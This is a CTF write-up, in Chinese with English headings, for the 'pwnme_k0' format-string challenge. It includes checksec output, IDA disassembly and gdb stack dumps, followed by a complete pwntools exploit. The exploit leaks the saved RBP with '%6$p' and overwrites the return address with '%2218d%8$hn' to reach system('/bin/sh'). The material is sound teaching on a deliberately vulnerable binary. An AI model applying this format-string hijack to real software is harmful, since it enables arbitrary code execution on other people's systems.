# pwnme_k0

> 三个白帽 sangebaimao
>
> file: `pwnme_k0`
>
> files link: https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0
>
> writeup writer: hexhex16@outlook.com
>
> refer writeup: https://ctf-wiki.org/pwn/linux/fmtstr/fmtstr_example/#hijack-retaddr

利用格式化字符串漏洞，劫持返回地址

- 分析`printf`处的栈帧，得出上一个RBP的值，从而计算得到返回地址的地址，解决程序每次运行时的地址会变的问题
- 用户名输入为返回地址的地址，密码输入为`%2218d%8$hn`，达到修改用户名指向的地址的双字节(`%8$hn`)为2218的目的。



# checksec

```bash
$ file pwnme_k0
pwnme_k0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=fca1e29210ffbe4aea1e56559306590dfe00c35b, stripped

$ checksec --file=pwnme_k0
RELRO       STACK CANARY     NX          PIE     RPATH     RUNPATH     Symbols     FORTIFY Fortified  Fortifiable  FILE
Full RELRO  No canary found  NX enabled  No PIE  No RPATH  No RUNPATH  No Symbols    No    0          5            pwnme_k0
```

- 64bit
- Full RELRO: got表不可写，并且禁止lazy resolution
- NX enabled



# IDA Analysis

- 在main函数中，注册完后，会调用的一个函数的switch case 1会调用的函数中，存在`printf`格式化字符串漏洞：

```c
int __fastcall sub_400B07(int a1, int a2, int a3, int a4, int a5, int a6, __int64 format, int a8, __int64 a9)
{
  write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
  printf((const char *)&format); // fmt str漏洞利用点
  return printf((const char *)&a9 + 4); // fmt str漏洞利用点
}
```

- 对应的汇编代码：

```assembly
.text:0000000000400B07 ; =============== S U B R O U T I N E =======================================
.text:0000000000400B07 ; Attributes: bp-based frame
.text:0000000000400B07 ; __int64 __fastcall sub_400B07(int, int, int, int, int, int, char format, int, int)
.text:0000000000400B07 sub_400B07      proc near               ; CODE XREF: sub_400D2B+44↓p
.text:0000000000400B07 format          = byte ptr  10h    ; 用户名的栈偏移量
.text:0000000000400B07 arg_14          = byte ptr  24h    ; 密码的栈偏移量
.text:0000000000400B07 ; __unwind {
.text:0000000000400B07                 push    rbp
.text:0000000000400B08                 mov     rbp, rsp
.text:0000000000400B0B                 mov     edx, 1Ah        ; n
.text:0000000000400B10                 mov     esi, offset aWelc0meToSange ; "Welc0me to sangebaimao!\n"
.text:0000000000400B15                 mov     edi, 0          ; fd
.text:0000000000400B1A                 call    write
.text:0000000000400B1F                 lea     rdi, [rbp+format] ; 用户名的栈偏移量 ; rdi是linux 64bit传参的第一个参数
.text:0000000000400B23                 mov     eax, 0
.text:0000000000400B28                 call    printf   ; printf
.text:0000000000400B2D                 lea     rax, [rbp+arg_14] ; 密码的栈偏移量
.text:0000000000400B31                 mov     rdi, rax        ; rdi是linux 64bit传参的第一个参数
.text:0000000000400B34                 mov     eax, 0
.text:0000000000400B39                 call    printf   ; printf
.text:0000000000400B3E                 nop
.text:0000000000400B3F                 pop     rbp
.text:0000000000400B40                 retn
.text:0000000000400B40 ; } // starts at 400B07
.text:0000000000400B40 sub_400B07      endp
```

- IDA观察汇编和在gdb中调试都可以发现，用户名和密码在栈上是相邻的，相距0x14=20B
- 在gdb中调试，输入用户名为abc，密码为pwxyz，在`0x0000000000400b28`断下时，分析printf的传参：

```assembly
Breakpoint 1, 0x0000000000400b28 in ?? ()
─────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x00007ffff7edcf33  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x1a
$rsp   : 0x00007fffffffe190  →  0x00007fffffffe1d0  →  0x00007fffffffe280  →  0x0000000000400eb0  →   push r15
$rbp   : 0x00007fffffffe190  →  0x00007fffffffe1d0  →  0x00007fffffffe280  →  0x0000000000400eb0  →   push r15
$rsi   : 0x00000000004010c3  →  "Welc0me to sangebaimao!\n"
$rdi   : 0x00007fffffffe1a0  →  0x000000000a636261 ("abc\n"?) # fmt str pointer point to 0x00007fffffffe1a0
$rip   : 0x0000000000400b28  →   call 0x400770 <printf@plt>
$r8    : 0x1999999999999999
$r9    : 0x0
$r10   : 0x00007ffff7f5fac0  →  0x0000000100000000
$r11   : 0x246
$r12   : 0x00000000004007b0  →   xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
───────────────────────────────────────── stack ────
0x00007fffffffe190│+0x0000: 0x00007fffffffe1d0  →  0x00007fffffffe280  →  0x0000000000400eb0  →   push r15       ← $rsp, $rbp
0x00007fffffffe198│+0x0008: 0x0000000000400d74  →   add rsp, 0x30
0x00007fffffffe1a0│+0x0010: 0x000000000a636261 ("abc\n"?)    ← $rdi ; addr of fmt str ; 8th para of fmt str pointer
0x00007fffffffe1a8│+0x0018: 0x0000000000000000
0x00007fffffffe1b0│+0x0020: 0x7978777000000000 ; 0x00007fffffffe1b4 为pw首地址 ; addr of fmt str of next printf
0x00007fffffffe1b8│+0x0028: 0x0000000000000a7a ("z\n"?)
0x00007fffffffe1c0│+0x0030: 0x0000000000000000
0x00007fffffffe1c8│+0x0038: 0x0000000000400d4d  →   cmp eax, 0x2
```

- RBP=`0x00007fffffffe190`，RBP+8 = `0x00007fffffffe198`为返回地址，`0x00007fffffffe1a0`为fmt str的实际地址，而fmt str指针存储在RDI中。由于Linux 64bit传参时，前6个参数用寄存器传递，RDI为第一个参数即fmt str指针，则`0x00007fffffffe1a0`对于fmt str指针来说，是第8个参数。第7个为返回地址，第6个为RBP。
- 在`0000000000400B39`断下时，主要在于RDI有区别，指向了密码处的地址，其他没有本质区别。

## how to hijack retaddr

1. 随意输入合法用户名，密码输入`%6$p`，然后输入1执行`printf(usr name); printf(pw);`得到RBP指向的地址上存储的上个RBP的值
2. 根据上个RBP的值，`-0x38`得到返回地址的地址(addr of ret addr)
3. 输入用户名为返回地址的地址
4. 输入密码为`%123d%8$hn`，`%8$hn`会将到此为止输出的字符个数(123)存储到第8个参数指向的双字节地址处（往该地址存储2B，内容为123）。123根据目标地址更改。
5. 输入1执行`printf(usr name); printf(pw);`，使得返回地址的地址被更改为目标地址



## offset of fmt str

- 也可以使用如下的输入来确认fmt str的偏移量：

```
AAAAAAAA%p%p%p%p%p%p%p%p%p
```

```assembly
gef➤  b *0x0000000000400B28
Breakpoint 1 at 0x400b28
gef➤  r
*Welcome to sangebaimao,Pwnn me and have fun!* .......
Register Account first!
Input your username(max lenth:20):
AAAAAAAA%p%p%p%p%p%p%p%p%p
Input your password(max lenth:20):
Register Success!!
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>1
Welc0me to sangebaimao!

Breakpoint 1, 0x0000000000400b28 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x00007ffff7edcf33  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x1a
$rsp   : 0x00007fffffffe190  →  0x00007fffffffe1d0  →  0x00007fffffffe280  →  0x0000000000400eb0  →   push r15
$rbp   : 0x00007fffffffe190  →  0x00007fffffffe1d0  →  0x00007fffffffe280  →  0x0000000000400eb0  →   push r15
$rsi   : 0x00000000004010c3  →  "Welc0me to sangebaimao!\n" ; Linux 64bit传参时的 2nd 参数
$rdi   : 0x00007fffffffe1a0  →  "AAAAAAAA%p%p%p%p%p%p%p%p%p\n" ; fmt str pointer，Linux 64bit传参时的 1st 参数
$rip   : 0x0000000000400b28  →   call 0x400770 <printf@plt>
$r8    : 0x1999999999999999
$r9    : 0x0
$r10   : 0x00007ffff7f5fac0  →  0x0000000100000000
$r11   : 0x246
$r12   : 0x00000000004007b0  →   xor ebp, ebp
$r13   : 0x0
$r14   : 0x0
$r15   : 0x0
$eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
──────────────────────────────────────────────────────── stack ────
0x00007fffffffe190│+0x0000: 0x00007fffffffe1d0  →  0x00007fffffffe280  →  0x0000000000400eb0  →   push r15       ← $rsp, $rbp
0x00007fffffffe198│+0x0008: 0x0000000000400d74  →   add rsp, 0x30
0x00007fffffffe1a0│+0x0010: "AAAAAAAA%p%p%p%p%p%p%p%p%p\n"       ← $rdi
0x00007fffffffe1a8│+0x0018: "%p%p%p%p%p%p%p%p%p\n"
0x00007fffffffe1b0│+0x0020: "%p%p%p%p%p\n"
0x00007fffffffe1b8│+0x0028: 0x00000000000a7025 ("%p\n"?)
0x00007fffffffe1c0│+0x0030: 0x0000000000000000
0x00007fffffffe1c8│+0x0038: 0x0000000000400d4d  →   cmp eax, 0x2
gef➤  c ; 下面的输出将在后面详细解释：
AAAAAAAA0x4010c30x1a0x7ffff7edcf330x1999999999999999(nil)0x7fffffffe1d00x400d740x41414141414141410x7025702570257025
0x6032a0(nil)(nil)
```

1. RSI=0x4010c3是传参时的2nd参数，对于fmt str pointer来说是1st参数
2. RDX=0x1a
3. RCX=0x7ffff7edcf33
4. R8=0x1999999999999999
5. R9=0x0 (nil)
6. RBP=0x7fffffffe1d0，对于fmt str pointer来说是6th参数。后面会根据这个值来计算返回地址的地址(addr of ret addr)。
7. ret addr=0x400d74，对于fmt str pointer来说是7th参数。利用思路就是更改这个值到目的地址
8. 0x4141414141414141="AAAAAAAA"，对于fmt str pointer来说是8th参数

- RBP(0x00007fffffffe190)中存储的值是上一个栈帧的RBP(0x00007fffffffe1d0)。每次运行时RBP的值会改变，但RBP位置处的值(0x00007fffffffe1d0)可以用`%6p`来输出，故返回地址的地址(即这里的`0x00007fffffffe198`)可以通过偏移量：`0x00007fffffffe198 - 0x00007fffffffe1d0 = -0x38 = -56`，来计算得出。



## Destination Addr

按shift+F12，或在函数调用(Function window / Imports)中，可以找到在`0x00000000004008A6`找到`system(/bin/sh)`调用。故可以改变上面分析到的 返回地址的地址 上面的 返回地址 为`0x00000000004008A6`，从而控制程序去执行`system(/bin/sh)`，也可以更改为`0x00000000004008AA`。

```assembly
.text:00000000004008A6 ; Attributes: bp-based frame
.text:00000000004008A6 sub_4008A6      proc near
.text:00000000004008A6 ; __unwind {
.text:00000000004008A6                 push    rbp
.text:00000000004008A7                 mov     rbp, rsp
.text:00000000004008AA                 mov     edi, offset command ; "/bin/sh"
.text:00000000004008AF                 call    system
.text:00000000004008B4                 pop     rdi
.text:00000000004008B5                 pop     rsi
.text:00000000004008B6                 pop     rdx
.text:00000000004008B7                 retn
.text:00000000004008B7 sub_4008A6      endp ; sp-analysis failed
.text:00000000004008B7 ; ---------------------------------------------------------------------------
.text:00000000004008B8                 db 90h
.text:00000000004008B9 ; ---------------------------------------------------------------------------
.text:00000000004008B9                 pop     rbp
.text:00000000004008BA                 retn
.text:00000000004008BA ; } // starts at 4008A6
```

- `system(/bin/sh)`的地址`0x4008A6`和上面的返回地址的值`0x400d74`仅在最后2B有区别，即最后4个16进制数有区别。

# Exploit

```python
from pwn import *  # sangebaimao exploit
context.log_level = "debug"
context.binary = './pwnme_k0'
sh = process("./pwnme_k0")
# gdb.attach(sh)

sh.recv()
sh.sendline("user1111")  # user name
sh.recv()
sh.sendline("%6$p")  # pw # to get last RBP value using cur RBP value
sh.sendline("1")  # 1.Sh0w Account Infomation! # let %6$p work
sh.recvuntil("0x")
lastRBP = sh.recvline().strip()  # sh.recvline(): b'7fffdc7918c0\n' <class 'bytes'>
print("lastRBP:", lastRBP, type(lastRBP))
addr_of_ret_addr = int(lastRBP, 16) - 0x38  # - 0x38 之后就是 addr of ret addr
print("addr_of_ret_addr:" + hex(addr_of_ret_addr))
sh.recv()

sh.writeline("2")  # 2.Ed1t Account Inf0mation!
sh.recv()  # please input new username(max lenth:20):
sh.sendline(p64(addr_of_ret_addr))  # user name: addr_of_ret_addr
sh.recv()  # please input new password(max lenth:20):
sh.sendline("%2218d%8$hn")  # pw # 0x08aa=2218 0x08a6=2214 # 将addr_of_ret_addr上的双字节改为0x08aa
# 至此，用户名和密码已经被更改，但是还没有达到劫持返回地址的目的，即还未执行printf(usr name); printf(pw)
sh.recv()
sh.sendline("1")  # 1.Sh0w Account Infomation! # hijack ret addr HERE
sh.recv()
sh.interactive()
```

- 逻辑解释见*how to hijack retaddr*



## Post Analysis

- 在ret addr被修改前的最后一个printf处断下，分析调用前的传参与栈帧：

```assembly
gef➤  c # 这时在 printf("%2218d%8$hn") 处断下 # 删除了部分输出
Continuing.
Breakpoint 1, 0x0000000000400b39 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────── registers ──── ..............
$rsp   : 0x00007fff664f9300  →  0x00007fff664f9340  →  0x00007fff664f93f0  →  0x0000000000400eb0  →   push r15
$rbp   : 0x00007fff664f9300  →  0x00007fff664f9340  →  0x00007fff664f93f0  →  0x0000000000400eb0  →   push r15
$rsi   : 0x664f9308        
$rdi   : 0x00007fff664f9324  →  "%2218d%8$hn\n" # fmt str pointer # printf函数的格式化字符串参数地址
$rip   : 0x0000000000400b39  →   call 0x400770 <printf@plt>
$r8    : 0x1999999999999999
$r9    : 0x6               
$r10   : 0x00007fff664f9310  →  0x00007fff664f9308  →  0x0000000000400d74  →   add rsp, 0x30
$r11   : 0x246             
$r12   : 0x00000000004007b0  →   xor ebp, ebp
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────── stack ────
0x00007fff664f9300│+0x0000: 0x00007fff664f9340 →  0x00007fff664f93f0  →  0x0000000000400eb0  →   push r15       ← $rsp, $rbp
0x00007fff664f9308│+0x0008: 0x0000000000400d74 →   add rsp, 0x30 # ret addr
0x00007fff664f9310│+0x0010: 0x00007fff664f9308 →  0x0000000000400d74 → add rsp, 0x30  ← $r10 # %8hn指向的地方，这里的值已被改为ret addr
0x00007fff664f9318│+0x0018: 0x0000000000000000
0x00007fff664f9320│+0x0020: 0x3132322500000000 # 0x00007fff664f9324 : fmt str addr
0x00007fff664f9328│+0x0028: "8d%8$hn\n"
0x00007fff664f9330│+0x0030: 0x0000000000000000
0x00007fff664f9338│+0x0038: 0x0000000000400d4d  →   cmp eax, 0x2
```

1. 格式化字符串为`"%2218d%8$hn\n"`
2. `%8$hn`指向的地址`0x00007fff664f9310`上存储的值为`0x00007fff664f9308`，也就是函数返回地址(ret addr, RBP + 8)

综上，执行完该printf函数后，`0x00007fff664f9308`处的双字节会被更改为`2218 = 0x08aa`。即原本的ret addr = `0x0000000000400d74`会被改为`0x00000000004008aa`，使得函数跳转到执行`system("/bin/sh")`

